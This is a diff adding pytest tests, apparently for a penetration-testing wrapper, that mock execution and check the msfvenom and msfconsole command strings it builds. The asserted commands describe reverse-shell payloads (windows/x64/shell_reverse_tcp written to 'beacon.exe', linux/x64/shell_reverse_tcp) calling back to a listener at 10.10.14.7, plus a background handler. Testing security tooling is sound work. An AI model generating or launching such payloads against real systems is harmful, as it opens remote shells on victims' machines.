@@ -128,3 +128,35 @@ class TestConfigurablePayload:
             assert mock_exec.called
             cmd = mock_exec.call_args[0][0]
             assert "windows/meterpreter/reverse_tcp" in cmd
+
+
+class TestMetasploitPayloadGeneration:
+    @patch("shutil.which", return_value="/usr/bin/msfvenom")
+    def test_msfvenom_uses_session_payload_settings(self, mock_which, infra, session):
+        session.set("lhost", "10.10.14.7")
+        session.set("lport", "8443")
+        session.set("payload", "windows/x64/shell_reverse_tcp")
+        session.set("payload_file", "beacon.exe")
+        with patch.object(infra, "_exec") as mock_exec:
+            infra.run_tool("msfvenom", preview=True)
+            assert mock_exec.called
+            cmd = mock_exec.call_args[0][0]
+            assert "msfvenom" in cmd
+            assert "windows/x64/shell_reverse_tcp" in cmd
+            assert "LHOST=10.10.14.7" in cmd
+            assert "LPORT=8443" in cmd
+            assert "-f exe" in cmd
+            assert "-o beacon.exe" in cmd
+
+    @patch("shutil.which", return_value="/usr/bin/msfconsole")
+    def test_msf_handler_uses_lhost_override(self, mock_which, infra, session):
+        session.set("lhost", "10.10.14.7")
+        session.set("payload", "linux/x64/shell_reverse_tcp")
+        with patch.object(infra, "_exec") as mock_exec:
+            infra.run_tool("msf")
+            assert mock_exec.called
+            cmd = mock_exec.call_args[0][0]
+            assert "set payload linux/x64/shell_reverse_tcp" in cmd
+            assert "set LHOST 10.10.14.7" in cmd
+            assert "set ExitOnSession false" in cmd
+            assert "exploit -j" in cmd
